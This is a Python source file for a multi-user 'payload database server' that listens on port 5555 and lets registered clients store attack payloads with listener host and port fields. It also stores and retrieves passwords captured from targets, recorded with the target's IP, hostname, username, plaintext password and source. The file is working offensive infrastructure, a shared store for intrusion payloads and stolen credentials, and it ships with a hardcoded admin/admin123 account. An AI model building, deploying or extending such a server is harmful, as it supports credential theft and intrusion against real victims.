#!/usr/bin/env python3
"""
PAYLOAD DATABASE SERVER - Central Server for Multiple Users
Run this on your server - clients connect to store/retrieve data
"""

import os
import sys
import sqlite3
import hashlib
import json
import threading
import socket
import time
import secrets
from datetime import datetime

# Colors
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class PayloadServer:
    def __init__(self, host="0.0.0.0", port=5555):
        self.host = host
        self.port = port
        self.db_path = "payload_server.db"
        self.init_database()
        
    def init_database(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                salt TEXT NOT NULL,
                api_key TEXT UNIQUE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Payloads table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                name TEXT,
                type TEXT,
                lhost TEXT,
                lport INTEGER,
                payload TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        
        # Captured passwords table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                target_ip TEXT,
                target_hostname TEXT,
                username TEXT,
                password TEXT,
                source TEXT,
                captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # Create default admin
        self.create_admin()
        
    def create_admin(self):
        """Create default admin account"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        if cursor.fetchone()[0] == 0:
            salt = os.urandom(32).hex()
            password = "admin123"
            password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000).hex()
            api_key = secrets.token_hex(32)
            cursor.execute("INSERT INTO users (username, password_hash, salt, api_key) VALUES (?, ?, ?, ?)",
                          ("admin", password_hash, salt, api_key))
            conn.commit()
            print(f"{Colors.GREEN}[+] Created admin: admin / admin123{Colors.RESET}")
            print(f"{Colors.YELLOW}[+] Admin API Key: {api_key}{Colors.RESET}")
        conn.close()
        
    def handle_client(self, conn, addr):
        """Handle client connection"""
        print(f"{Colors.BLUE}[+] Client connected from {addr[0]}:{addr[1]}{Colors.RESET}")
        
        try:
            data = conn.recv(65536).decode()
            if not data:
                return
                
            request = json.loads(data)
            action = request.get('action')
            api_key = request.get('api_key')
            
            # Verify API key
            user_id = self.verify_api_key(api_key)
            if not user_id and action != "register":
                conn.send(json.dumps({"status": "error", "message": "Invalid API key"}).encode())
                conn.close()
                return
                
            if action == "register":
                response = self.register_user(request)
            elif action == "save_payload":
                response = self.save_payload(user_id, request)
            elif action == "get_payloads":
                response = self.get_payloads(user_id)
            elif action == "save_password":
                response = self.save_password(user_id, request)
            elif action == "get_passwords":
                response = self.get_passwords(user_id)
            elif action == "delete_payload":
                response = self.delete_payload(user_id, request)
            else:
                response = {"status": "error", "message": "Unknown action"}
                
            conn.send(json.dumps(response).encode())
            
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")
        finally:
            conn.close()
            print(f"{Colors.BLUE}[-] Client disconnected{Colors.RESET}")
            
    def verify_api_key(self, api_key):
        """Verify API key and return user_id"""
        if not api_key:
            return None
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id FROM users WHERE api_key = ?", (api_key,))
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else None
        
    def register_user(self, request):
        """Register a new user"""
        username = request.get('username')
        password = request.get('password')
        
        if not username or not password:
            return {"status": "error", "message": "Username and password required"}
            
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Check if user exists
        cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
        if cursor.fetchone():
            conn.close()
            return {"status": "error", "message": "Username already exists"}
            
        # Create user
        salt = os.urandom(32).hex()
        password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000).hex()
        api_key = secrets.token_hex(32)
        
        cursor.execute("INSERT INTO users (username, password_hash, salt, api_key) VALUES (?, ?, ?, ?)",
                      (username, password_hash, salt, api_key))
        conn.commit()
        conn.close()
        
        return {"status": "success", "message": "User registered", "api_key": api_key}
        
    def save_payload(self, user_id, request):
        """Save a payload for user"""
        name = request.get('name')
        ptype = request.get('type')
        lhost = request.get('lhost')
        lport = request.get('lport')
        payload = request.get('payload')
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO payloads (user_id, name, type, lhost, lport, payload)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, name, ptype, lhost, lport, payload))
        conn.commit()
        payload_id = cursor.lastrowid
        conn.close()
        
        return {"status": "success", "message": "Payload saved", "id": payload_id}
        
    def get_payloads(self, user_id):
        """Get all payloads for user"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, name, type, lhost, lport, created_at FROM payloads WHERE user_id = ? ORDER BY id DESC", (user_id,))
        payloads = cursor.fetchall()
        conn.close()
        
        return {"status": "success", "payloads": payloads}
        
    def save_password(self, user_id, request):
        """Save captured password"""
        target_ip = request.get('target_ip')
        target_hostname = request.get('target_hostname')
        username = request.get('username')
        password = request.get('password')
        source = request.get('source')
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO captured (user_id, target_ip, target_hostname, username, password, source)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, target_ip, target_hostname, username, password, source))
        conn.commit()
        conn.close()
        
        return {"status": "success", "message": "Password saved"}
        
    def get_passwords(self, user_id):
        """Get all captured passwords for user"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, target_ip, target_hostname, username, password, source, captured_at FROM captured WHERE user_id = ? ORDER BY id DESC", (user_id,))
        passwords = cursor.fetchall()
        conn.close()
        
        return {"status": "success", "passwords": passwords}
        
    def delete_payload(self, user_id, request):
        """Delete a payload"""
        payload_id = request.get('payload_id')
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM payloads WHERE id = ? AND user_id = ?", (payload_id, user_id))
        conn.commit()
        conn.close()
        
        return {"status": "success", "message": "Payload deleted"}
        
    def start(self):
        """Start the server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}     PAYLOAD DATABASE SERVER{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Host: {self.host}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Port: {self.port}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Database: {self.db_path}{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Waiting for connections...{Colors.RESET}\n")
        
        while True:
            try:
                conn, addr = server.accept()
                thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                thread.daemon = True
                thread.start()
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Server stopped{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    server = PayloadServer()
    server.start()
